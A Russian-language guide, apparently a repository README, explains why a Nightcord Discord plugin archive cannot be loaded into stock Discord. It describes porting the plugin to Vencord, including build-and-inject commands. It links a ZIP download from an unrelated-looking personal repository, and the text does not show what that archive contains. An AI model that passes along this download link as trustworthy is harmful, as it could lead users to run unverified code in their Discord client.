# Как запустить `nightcord-master.zip` без Nightcord

Коротко: **напрямую в обычный Discord этот ZIP установить нельзя**. Официальный Discord не поддерживает плагины из `.zip`, `.ts`, `.tsx` или `.js`.

Архив `nightcord-master.zip` содержит исходники плагина Nightcord:

```text
nightcord/src/nightcordplugins/customProfile/index.tsx
nightcord/src/nightcordplugins/customProfile/styles.css
```

Это не готовый файл BetterDiscord/Vencord-плагина. Его нельзя просто перетащить в Discord.

## Скачать архив

Прямая ссылка на скачивание:

```text
https://raw.githubusercontent.com/Korimuspast1/pr/plugin/nightcord-master.zip
```

## Если нужно именно без Nightcord

Нужен другой мод-клиент, например **Vencord** или **BetterDiscord**.

### Вариант 1: Vencord

Это самый близкий вариант, потому что код похож на Vencord/Nightcord-плагин. Но **как есть он не соберётся в обычном Vencord**, потому что использует Nightcord-only API:

- `../autoTranslateNightcord`
- `@api/pluginI18n`
- `../../api/PluginSync`
- `../../api/OAuth2`
- `@api/HeaderBar`

Чтобы использовать его в Vencord, плагин нужно портировать: убрать/заменить эти импорты и отключить функции синхронизации через Nightcord.

Общий путь после портирования:

```powershell
git clone https://github.com/Vendicated/Vencord.git
cd Vencord
corepack enable
pnpm install --frozen-lockfile
mkdir src\userplugins\customProfile
# сюда копируются портированные index.tsx и styles.css
pnpm build
pnpm inject
```

После этого нужно перезапустить Discord и включить плагин в настройках Vencord.

### Вариант 2: BetterDiscord

BetterDiscord принимает плагины формата `.plugin.js`. Этот архив содержит `.tsx`, поэтому для BetterDiscord его нужно переписать почти заново. Просто положить ZIP или `index.tsx` в папку BetterDiscord plugins не получится.

## Важно

- Моды клиента Discord могут нарушать правила Discord, используйте на свой риск.
- Не вставляйте Discord token ни в какие плагины/сайты.
- Запускайте только код, которому доверяете.

Порт под Vencord уже добавлен в репозиторий: `vencord-userplugins/customProfile/`. Инструкция: `VENCORD_PORT_RU.md`.
